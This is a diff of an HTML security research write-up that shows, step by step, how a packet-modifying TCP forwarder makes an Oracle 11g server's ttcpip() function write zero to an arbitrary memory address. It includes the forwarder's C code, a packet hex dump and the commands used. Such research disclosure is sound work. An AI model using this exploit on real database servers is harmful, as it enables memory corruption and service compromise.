@@ -19,7 +19,7 @@ In other circumstances, like another RDBMS versions and OS-es, packet which need
 <p>In our case, it is just adapter between RDBMS and "legal" application asking for version.</p>
 <p>When TCP forwarder detect TTIPFN packet sent from client to server, it modify it:</p>
 
-<pre>
+_PRE_BEGIN
 	      if (buf[0xA]==0x11) // TTIPFN, that's our packet
 		{
 		  printf ("TTIPFN from client, we modify it.\n");
@@ -31,11 +31,11 @@ In other circumstances, like another RDBMS versions and OS-es, packet which need
 		  buf[86]=(pos >> 16)&0xFF;
 		  buf[87]=(pos >> 24)&0xFF;
 		};
-</pre>
+_PRE_END
 
 <p>The packet we need to modify should looks like:</p>
 
-<pre>
+_PRE_BEGIN
 0000   00 f9 00 00 06 00 00 00 00 00 11 6b 04 82 00 00  ...........k....
 0010   00 2a 00 00 00 01 00 00 00 03 9f 05 71 80 00 00  .*..........q...
 0020   00 00 00 00 fe ff ff ff 17 00 00 00 fe ff ff ff  ................
@@ -43,7 +43,7 @@ In other circumstances, like another RDBMS versions and OS-es, packet which need
 0040   01 00 00 00 00 28 00 00 00 00 00 00 00 00 00 00  .....(..........
 0050   00 00 00 00 34 12 cd ab 00 00 00 00 fe ff ff ff  ....4...........
 
-<p><b>34 12 cd ab</b> here is the DWORD we modify</p>
+... 34 12 cd ab here is the DWORD we modify
 
 0060   fe ff ff ff fe ff ff ff 01 00 00 00 00 00 00 00  ................
 0070   fe ff ff ff fe ff ff ff 00 00 00 00 00 00 00 00  ................
@@ -55,13 +55,13 @@ In other circumstances, like another RDBMS versions and OS-es, packet which need
 00d0   00 00 00 00 00 00 00 00 01 01 00 00 00 ff 27 00  ..............'.
 00e0   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
 00f0   00 b2 00 01 00 00 00 00 00                       .........
-</pre>
+_PRE_END
 
 <p><i>pos</i> is the address which we like to write 0 at.</p>
 
 <p>Let's look for some random SGA variable in memory:</p>
 
-<pre>
+_PRE_BEGIN
 SQL> oradebug setmypid
 Statement processed.
 
@@ -70,13 +70,13 @@ Statement processed.
 
 SQL> oradebug dumpvar sga kywmpleq1_e_
 sword kywmpleq1_e_ [20001070, 20001074) = 0000014B
-</pre>
+_PRE_END
 
 <p>Now run TCP forwarder on win32 box:</p>
 
-<pre>
+_PRE_BEGIN
 tcp_fwd 192.168.0.100 1521 192.168.0.115 1521 0x20001070
-</pre>
+_PRE_END
 
 <p>192.168.0.100 is the address of Win32 box and .115 is the address of 11g server Linux x86.</p>
 
@@ -86,18 +86,20 @@ tcp_fwd 192.168.0.100 1521 192.168.0.115 1521 0x20001070
 This utility login into database as SCOTT, so this account need to be unlocked.</p>
 
 <p>Now run it:</p>
-<pre>
+
+_PRE_BEGIN
 export LD_LIBRARY_PATH=$ORACLE_HOME/lib
 ./version 192.168.0.100/orcl
-</pre>
+_PRE_END
+
 <p>Run "version" executable.</p>
 
 <p>Now let's check SGA variable again:</p>
 
-<pre>
+_PRE_BEGIN
 SQL> oradebug dumpvar sga kywmpleq1_e_
 sword kywmpleq1_e_ [20001070, 20001074) = 00000000
-</pre>
+_PRE_END
 
 <p>Actually, function ttcpip() writes zero to arbitrary memory location.
 Probably, the problem lies in TTC datatypes handling.</p>
